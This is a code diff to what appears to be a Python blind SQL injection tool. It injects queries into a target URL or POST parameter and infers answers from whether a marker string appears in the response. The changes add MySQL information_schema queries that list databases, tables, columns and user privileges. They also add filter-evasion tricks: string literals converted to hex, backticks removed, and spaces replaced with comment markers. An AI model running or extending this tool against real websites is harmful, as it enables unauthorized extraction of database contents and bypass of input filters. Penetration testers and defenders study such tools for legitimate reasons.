@@ -1,3 +1,4 @@
+import re
 import sys
 import argparse
 from urllib  import quote_plus
@@ -47,12 +48,14 @@ class Searcher( object ):
         url  = self.url.replace( '@', quote_plus( sql ) )
         post = self.post and self.post.replace( '@', quote_plus( sql ) )
         try:
+            self.log( 2, '...testing url=%s POST=%s ' % ( url, post ), newline = False )
             html = urlopen( url, post ).read()
-            self.log( 2, '...testing url=%s POST=%s --> %s' % ( url, post, self.sss in html ) )
+            self.log( 2, '--> %s' % ( self.sss in html ) )
             self.log( 3, '----html----\n%s\n----html----\n' % html )
             return self.sss in html
         except Exception, e:
             if args.error2false:
+                self.log( 2, '--> error %s' % e )
                 return False
             raise e
 
@@ -133,15 +136,15 @@ class Searcher( object ):
 
 class SQL:
     arr = { 'mysql': {}, 'postgres': {} }
-    arr[ 'mysql' ][ 'user'        ] = 'SELECT USER()'
-    arr[ 'mysql' ][ 'dbs'         ] = 'SELECT schema_name FROM information_schema.schemata LIMIT %(i)s,1'
-    arr[ 'mysql' ][ 'dbs_cnt'     ] = 'SELECT count(schema_name) FROM information_schema.schemata'
-    arr[ 'mysql' ][ 'tables'      ] = 'SELECT table_name FROM information_schema.tables WHERE table_schema=%(db)s LIMIT %(i)s,1'
-    arr[ 'mysql' ][ 'tables_cnt'  ] = 'SELECT count(table_name) FROM information_schema.tables WHERE table_schema=%(db)s'
-    arr[ 'mysql' ][ 'columns'     ] = 'SELECT column_name FROM information_schema.columns WHERE table_schema=%(db)s AND table_name=%(tbl)s LIMIT %(i)s,1'
-    arr[ 'mysql' ][ 'columns_cnt' ] = 'SELECT count(column_name) FROM information_schema.columns WHERE table_schema=%(db)s AND table_name=%(tbl)s'
-    arr[ 'mysql' ][ 'privs'       ] = 'SELECT privilege_type FROM information_schema.user_privileges WHERE grantee like %(user)s LIMIT %(i)s,1';
-    arr[ 'mysql' ][ 'privs_cnt'   ] = 'SELECT count(privilege_type) FROM information_schema.user_privileges WHERE grantee like %(user)s';
+    arr[ 'mysql' ][ 'user'        ] = "SELECT USER()"
+    arr[ 'mysql' ][ 'dbs'         ] = "SELECT schema_name FROM `information_schema`.schemata LIMIT %(i)s,1"
+    arr[ 'mysql' ][ 'dbs_cnt'     ] = "SELECT count(schema_name) FROM `information_schema`.schemata"
+    arr[ 'mysql' ][ 'tables'      ] = "SELECT table_name FROM `information_schema`.tables WHERE table_schema='%(db)s' LIMIT %(i)s,1"
+    arr[ 'mysql' ][ 'tables_cnt'  ] = "SELECT count(table_name) FROM `information_schema`.tables WHERE table_schema='%(db)s'"
+    arr[ 'mysql' ][ 'columns'     ] = "SELECT column_name FROM `information_schema`.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s' LIMIT %(i)s,1"
+    arr[ 'mysql' ][ 'columns_cnt' ] = "SELECT count(column_name) FROM `information_schema`.columns WHERE table_schema='%(db)s' AND table_name='%(tbl)s'"
+    arr[ 'mysql' ][ 'privs'       ] = "SELECT privilege_type FROM `information_schema`.user_privileges WHERE grantee like '%(user)s' LIMIT %(i)s,1";
+    arr[ 'mysql' ][ 'privs_cnt'   ] = "SELECT count(privilege_type) FROM `information_schema`.user_privileges WHERE grantee like '%(user)s'";
 
     def __init__( self, eng  ):
         self.eng = eng
@@ -152,19 +155,25 @@ class SQL:
 
     def prepare( self, s ):
         for c in args.avoid:
-            if c == ' ':
+            if c == "'":
+                r = re.compile( r"'((?:[^'\\]|\\.)*)'" )
+                s = r.sub( lambda m: self.my_hex( m.group( 1 ) ), s )
+            elif c == '`':
+                s = s.replace( '`', '' )
+            elif c == ' ':
                 s = s.replace( ' ', '/**/' )
+
         return '(%s)' % s
 
     def __call__( self, name, **kargs ):
         s = self.arr[ self.eng ][ name ]
 
-        if self.eng == 'mysql':
-            for k,v in kargs.iteritems():
-                if type( v ) is str:
-                    kargs[ k ] = self.my_hex( v )
+        #if self.eng == 'mysql':
+        #    for k,v in kargs.iteritems():
+        #        if type( v ) is str:
+        #            kargs[ k ] = self.my_hex( v )
 
-        return self.prepare( s ) % kargs
+        return self.prepare( s % kargs )
 
 s = Searcher( url = args.url,
               sss = args.string,
